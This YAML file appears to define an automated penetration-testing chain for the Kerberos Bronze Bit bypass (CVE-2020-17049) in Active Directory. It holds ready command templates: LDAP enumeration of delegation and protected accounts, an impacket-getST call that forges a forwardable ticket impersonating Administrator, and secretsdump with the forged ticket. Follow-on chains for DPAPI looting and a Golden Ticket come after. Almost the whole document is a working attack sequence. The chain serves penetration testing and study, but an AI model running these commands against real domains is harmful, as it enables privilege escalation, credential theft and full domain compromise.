id: kerberos-bronze-bit
name: "AD — Bronze Bit (CVE-2020-17049) bypass forwardable check"
description: >
  Constrained delegation without protocol transition normally refuses to
  emit a forwardable TGS for an unforwardable user. The Bronze Bit flips
  the forwardable flag at S4U2self time, letting you S4U2proxy as protected
  users (Domain Admins) too.
tags: [kerberos, bronze-bit, cve-2020-17049, delegation, priv-esc]
difficulty: hard

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: domain
    source: target_context.domain
    required: true
  - name: delegating_principal
    description: "Computer/user with constrained delegation set."
    required: true
  - name: delegating_aes_key
    description: "AES256 key OR NT hash of the delegating principal."
    required: true
  - name: target_spn
    description: "SPN to ride into (e.g. cifs/dc01.corp.local)."
    required: true

steps:
  - id: confirm_constrained
    name: "Confirm the principal has constrained delegation"
    command_ref: nxc-ldap-find-delegation
    inputs:
      dc-ip: "${dc_ip}"
    notes: |
      Bronze Bit requires `TRUSTED_TO_AUTH_FOR_DELEGATION` to be FALSE (no
      protocol transition). If TRUE, just use the standard
      constrained-delegation-s4u chain instead.

  - id: confirm_target_protected
    name: "Confirm the impersonation target is in 'Protected Users' / Sensitive"
    inline_command: |
      nxc ldap <dc-ip> -u <user> -p <password> --query \
        "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))" \
        "sAMAccountName,distinguishedName"
    inputs:
      dc-ip: "${dc_ip}"
    notes: |
      `0x100000` = ACCOUNTDISABLE? No — that flag means NOT_DELEGATED. If
      Administrator has it, S4U normally fails. Bronze Bit bypasses that.

  - id: detonate_bronze_bit
    name: "Run S4U2self+S4U2proxy with -force-forwardable"
    inline_command: |
      impacket-getST \
        -spn '<target_spn>' \
        -impersonate Administrator \
        -dc-ip <dc-ip> \
        -force-forwardable \
        '<domain>/<principal>:<aes_or_nt>'
    inputs:
      dc-ip: "${dc_ip}"
      domain: "${domain}"
      principal: "${delegating_principal}"
      aes_or_nt: "${delegating_aes_key}"
      target_spn: "${target_spn}"
    notes: |
      Requires patched impacket (`getST.py` with -force-forwardable). The
      ticket file ends up at `<user>@<spn>.ccache`. PATCH STATUS: KB4598347
      (Feb 2021) fixed it — only works on unpatched DCs (still very common
      on HTB/labs).
    capture:
      - var: bronze_ccache
        regex: "Saving ticket in (\\S+\\.ccache)"
        match: first

  - id: use_ticket
    name: "Use the forged ticket"
    inline_command: |
      export KRB5CCNAME=<ccache>
      klist
      impacket-secretsdump -k -no-pass <target_host>
    inputs:
      ccache: "${bronze_ccache}"

references:
  - title: "Bronze Bit (Netspi)"
    url:   "https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/"
  - title: "Impacket -force-forwardable"
    url:   "https://github.com/fortra/impacket/pull/1101"

next_chains:
  - chain: dpapi-secrets-extraction
    when:   'forged admin ticket on a host'
    reason: 'Loot DPAPI on the now-owned target.'
  - chain: ad-persistence-golden-ticket
    when:   'target was DC'
    reason: 'Domain compromise → Golden Ticket.'
